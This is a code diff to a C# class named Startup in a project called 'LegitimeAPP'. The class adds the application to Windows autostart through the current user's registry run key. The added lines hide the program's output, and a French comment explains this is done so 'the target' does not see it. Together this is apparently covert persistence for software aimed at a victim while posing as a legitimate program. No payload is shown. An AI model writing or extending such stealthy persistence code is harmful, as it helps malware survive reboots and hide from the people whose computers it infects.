@@ -1,9 +1,14 @@
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using Microsoft.Win32;
+using LegitimeAPP.OS ; 
 
 namespace LegitimeAPP.OS
 {
+
+    /**
+    Classe pour permettre 
+    */
     public class Startup
     {
 
@@ -12,6 +17,8 @@ namespace LegitimeAPP.OS
 
         public Startup()
         {
+
+              // Ajout de l'application au démarrage de l'ordinateur  
             AddApplicationFromStartup() ; 
         }
 
@@ -20,6 +27,10 @@ namespace LegitimeAPP.OS
 
             if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
             {
+
+
+
+
                 using (RegistryKey key = Registry.CurrentUser.OpenSubKey(_autoStartKey, false))
                 {
                     return (bool)(key.GetValue(_applicationName, null) ?? false);
@@ -46,6 +57,16 @@ namespace LegitimeAPP.OS
 
             if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
             {
+
+                                /* 
+                On ne l'affiche pas pour pas que la cible le voit
+                Dans les prochaines mises a jour je vais enlever les 
+                message de debug 
+                */
+
+               Output.Hide() ; 
+
+               
                 using (RegistryKey key = Registry.CurrentUser.OpenSubKey(_autoStartKey, true))
                 {
                     if (!IsStartWithPC())
